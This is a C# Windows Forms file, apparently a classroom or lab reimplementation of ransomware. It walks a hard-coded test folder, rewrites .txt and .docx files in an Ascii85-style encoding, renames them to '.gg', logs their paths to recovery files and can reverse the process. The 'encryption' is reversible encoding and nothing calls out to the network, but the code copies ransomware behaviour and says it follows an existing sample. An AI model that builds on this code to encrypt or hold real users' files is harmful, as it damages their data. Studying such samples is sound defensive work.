using System;
using System.Collections.Generic;

using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
//using SHDocVw;
//using CodeFluent.Runtime.BinaryServices;
using System.Collections;
using System.ServiceProcess;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Drawing.Imaging;

namespace _519As1FormsApp
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            textBox1.Multiline = true;
            textBox1.ScrollBars = ScrollBars.Both;
        }
        static readonly string EXT = ".gg";
        static readonly List<string> ENLIST = new() { ".txt", ".docx" };
        static readonly string Path1 = @"C:\Windows\Temp";
        static readonly string Path11 = "C:\\Users\\rl269\\Documents\\RansTest\\Temp";
        static readonly string Path2 = "OriginalPath.txt";
        static readonly string Path3 = "EncPath.txt";
        static readonly string Path4 = "DeletedItems.txt";
        static readonly string ORIGINALPATH = Path.Combine(Path1, Path2);
        static readonly string ORIGINALPATH1 = Path.Combine(Path11, Path2);
        static readonly string ENCPATH = Path.Combine(Path1, Path3);
        static readonly string ENCPATH1 = Path.Combine(Path11, Path3);
        static readonly string DELETED = Path.Combine(Path1, Path4);
        static readonly string NOTICE = "DO NOT DELETE THIS FILE!! THIS FILE IS USED FOR DECRYPTION";

        public void LoopThroughDir(string filePath, bool isDecrypt = false)
        {
            try
            {
                string[] files = GetFiles(filePath);
                for (int i = 0; i < files.Length; i++)
                {
                    string fileExt = Path.GetExtension(files[i]);
                    bool isTargetFile = IsTarget(fileExt, files[i]);
                    if (isTargetFile)
                    {
                        //ShowInTextBox(files[i]);
                        if (isDecrypt)
                            Decrypt(files[i], AddNewToFileName(files[i], "_dec"));
                        else
                        {
                            //Encrypt(files[i], AddNewToFileName(files[i], "_enc"));
                            Encrypt(files[i]);
                            AddFilePath(files[i]);
                        }
                    }
                    //textBox1.AppendText(fileExt + isTargetFile + Environment.NewLine);
                }

                string[] fileObjs = getDirectories(filePath);
            }
            catch (Exception)
            {

                throw;
            }
        }

        private void AddFilePath(string f)
        {
            // C:\Windows\Temp\OriginalPath.txt
            // C:\Windows\Temp\EncPath.txt
            try
            {
                if (File.Exists(ORIGINALPATH1))
                {
                    using (StreamWriter streamWriter = new StreamWriter(ORIGINALPATH1, true))
                    {
                        streamWriter.WriteLine(f);
                    }
                }
                else
                {

                    using (StreamWriter sw = new StreamWriter(ORIGINALPATH1))
                    {
                        sw.WriteLine(NOTICE);
                        sw.WriteLine(f);
                    }
                }

                if (File.Exists(ENCPATH1))
                {
                    using (StreamWriter streamWriter = new StreamWriter(ENCPATH1, true))
                    {
                        var halfPath = Path.Combine(Path.GetDirectoryName(f), Path.GetFileNameWithoutExtension(f));
                        string file = halfPath + EXT;
                        streamWriter.WriteLine(file);
                    }
                }
                else
                {

                    using (StreamWriter sw = new StreamWriter(ENCPATH1))
                    {
                        sw.WriteLine(NOTICE);
                        var halfPath = Path.Combine(Path.GetDirectoryName(f), Path.GetFileNameWithoutExtension(f));
                        string file = halfPath + EXT;
                        sw.WriteLine(file);
                    }
                }
            }
            catch (Exception)
            { 
                throw new NotImplementedException();
            }
        }

        static string AddNewToFileName(string originalFileName, string addName)
        {
            string directory = Path.GetDirectoryName(originalFileName);
            string extension = Path.GetExtension(originalFileName); 
            string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(originalFileName);
            string newFileNameWithoutExtension = fileNameWithoutExtension + addName; 
            string newFileName = Path.Combine(directory, newFileNameWithoutExtension + extension); 
            return newFileName;
        }

        void ShowInTextBox(string text, string? appd = null)
        {
            if (appd == null) appd = Environment.NewLine;
            textBox1.AppendText(text + appd);
        }
        void ShowInTextBox(uint value, string? appd = null)
        {
            if (appd == null) appd = Environment.NewLine;
            textBox1.AppendText(Convert.ToString(value, 2) + appd);
        }
        void ShowInTextBox(StringBuilder sb, string? appd = null)
        {
            if (appd == null) appd = Environment.NewLine;
            textBox1.AppendText(sb.ToString() + appd);
        }

        void ShowInTextBox(byte[] bytes, string? appd = null, int? system = 16)
        {
            if (appd == null) appd = Environment.NewLine;
            StringBuilder sb = new StringBuilder();
            foreach (byte b in bytes)
            {
                if(system == 16)
                    sb.Append(b.ToString("X2") + ' ');
                else
                    sb.Append(Convert.ToString(b, 2).PadLeft(8, '0') + appd);
            }
            ShowInTextBox(sb.ToString(), appd);
        }

        void Encrypt(string filePath, string newFilePath = "")
        {
            if (newFilePath == "") newFilePath = filePath;
            FileInfo info = new FileInfo(filePath);
            try
            {
                if (info.Length > 0)
                {
                    //textBox1.AppendText(filePath + info.Length + Environment.NewLine);
                    if (filePath.Contains("txt") || filePath.Contains("docx"))
                    {
                        byte[] fileBytes = File.ReadAllBytes(filePath);
                        string encodedStr = Encode(fileBytes);
                        using (StreamWriter sw = new StreamWriter(newFilePath)) 
                        { 
                            sw.WriteLine(encodedStr);
                        }
                        ChangeExt(filePath);
                    }
                }
            }
            catch (Exception)
            {

                throw;
            }
        }

        void ChangeExt(string filePath)
        {
            try
            {
                string prevPath = Path.GetDirectoryName(filePath);
                string prevFile = Path.GetFileNameWithoutExtension(filePath);
                string endFile = prevPath + "\\" + prevFile + EXT;
                if (File.Exists(endFile))
                {

                }
                else if (File.Exists(filePath))
                {
                    File.Move(filePath, endFile);
                }
                else
                    return;
                ChMetaData(endFile);
            }
            catch (Exception)
            {

                throw;
            }
        }

        private static void ChMetaData(string endFile)
        {
            try
            {            }
            catch (Exception)
            {
                throw;
            }
        }

        string Encode(byte[] bytes)
        {
            if (bytes == null)
                throw new ArgumentNullException(nameof(bytes));
            StringBuilder sb = new(bytes.Length * 5 / 4);
            int count = 0;
            uint value = 0;
            foreach (byte b in bytes)
            {
                value |= ((uint)b) << (24 - (count * 8));
                count++;
                if (count == 4)
                {
                    if (value == 0)
                    {
                        sb.Append('z');
                    } else
                    {
                        EncodeValue(sb, value, 0);
                    }
                    //ShowInTextBox(value);
                    count = 0;
                    value = 0;
                }
            }
            if (count > 0)
                EncodeValue(sb, value, 0);
            string enc1 = sb.ToString().Trim();
            return enc1;
        }
        const char c_firstCharacter = '!';

        static void EncodeValue(StringBuilder sb, uint value, int paddingBytes)
        {
            char[] encoded = new char[5];
            for (int i = 4; i >= 0; i--)
            {
                encoded[i] = (char)((value % 85) + c_firstCharacter);
                value /= 85;
            }
            if(paddingBytes != 0) 
                Array.Resize(ref encoded, 5 - paddingBytes);
            sb.Append(encoded);
        }

        void Decrypt(string file, string outputFile)
        {
            try
            {
                string encodedStr = File.ReadAllText(file, Encoding.UTF8);

                if (encodedStr.EndsWith(Environment.NewLine))
                {
                    encodedStr = encodedStr.Substring(0, encodedStr.Length - Environment.NewLine.Length);
                }

                byte[] decodedBytes = Decode(encodedStr);
                File.WriteAllBytes(outputFile, decodedBytes);
            }
            catch { }
        }




        byte[] Decode(string encoded)
        {
            List<byte> output = new List<byte>();
            uint value = 0;
            int count = 0;

            foreach (char c in encoded)
            {
                if (c == 'z' && count == 0)
                {
                    output.AddRange(new byte[4]);
                    continue;
                }

                value = (value * 85) + ((uint)c - c_firstCharacter);
                count++;

                if (count == 5)
                {
                    output.Add((byte)((value >> 24) & 0xFF));
                    output.Add((byte)((value >> 16) & 0xFF));
                    output.Add((byte)((value >> 8) & 0xFF));
                    output.Add((byte)(value & 0xFF));

                    value = 0;
                    count = 0;
                }
            }

            if (count > 0)
            {
                int paddingBytes = 5 - count;
                value *= (uint)Math.Pow(85, paddingBytes);

                while (count-- > 1)
                {
                    output.Add((byte)((value >> (24 - (4 - count) * 8)) & 0xFF));
                }
            }

            return output.ToArray();
        }
        public void DecryptFiles(int flag)
        {
            string originalPathFile = "";
            string encPathFile = "";
            if (flag == 0)
            {
                originalPathFile = @"C:\Users\rl269\Documents\RansTest\Temp\OriginalPath.txt";
                encPathFile = @"C:\Users\rl269\Documents\RansTest\Temp\EncPath.txt";
            } else
            {
                originalPathFile = @"C:\Windows\Temp\OriginalPath.txt";
                encPathFile = @"C:\Windows\Temp\EncPath.txt";
            }

            string[] originalPaths = File.ReadAllLines(originalPathFile);
            string[] encPaths = File.ReadAllLines(encPathFile);
            ShowInTextBox(originalPathFile);
            ShowInTextBox(encPathFile);
            for (int i = 1; i < originalPaths.Length; i++)
            {
                string originalPath = originalPaths[i];
                string encPath = encPaths[i];
                ShowInTextBox("getting enced file:");
                ShowInTextBox(encPath);
                string newEncPath = Path.ChangeExtension(encPath, Path.GetExtension(originalPath));
                ShowInTextBox("newEncPath is:");
                ShowInTextBox(newEncPath);
                File.Move(encPath, newEncPath);
                ShowInTextBox("start decrypt:");
                Decrypt(newEncPath, newEncPath);
                ShowInTextBox("originalPath is:");
                ShowInTextBox(originalPath);
                File.Move(newEncPath, originalPath);
            }

            MessageBox.Show("finished!");
        }

        static Boolean IsTarget(string fileExt, string fileName)
        {
            if(string.Equals(fileExt, EXT) == false)
            {
                // source code checked if it's InStrucT1onss.txt, but not needed here
                if(ENLIST.Contains(fileExt) && (!(fileName.Equals(ORIGINALPATH) || fileName.Equals(ENCPATH) || fileName.Equals(DELETED)))) {
                    return true;
                }
            }
            return false;
        }
         
        private string[] GetFiles(string parentDir)
        {
            string[] files = Directory.GetFiles(parentDir);
            return files;
        }

        private string[] getDirectories(string parentDir)
        {
            string[] Dirs = Directory.GetDirectories(parentDir);
            return Dirs;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
            LoopThroughDir("C:\\Users\\rl269\\Documents\\RansTest");

        }

        private void button2_Click(object sender, EventArgs e)
        {
            
            LoopThroughDir("C:\\Users\\rl269\\Documents\\RansTest\\encrypted", true);

        }

        private void button3_Click(object sender, EventArgs e)
        {
            DecryptFiles(1);
        }
    }
}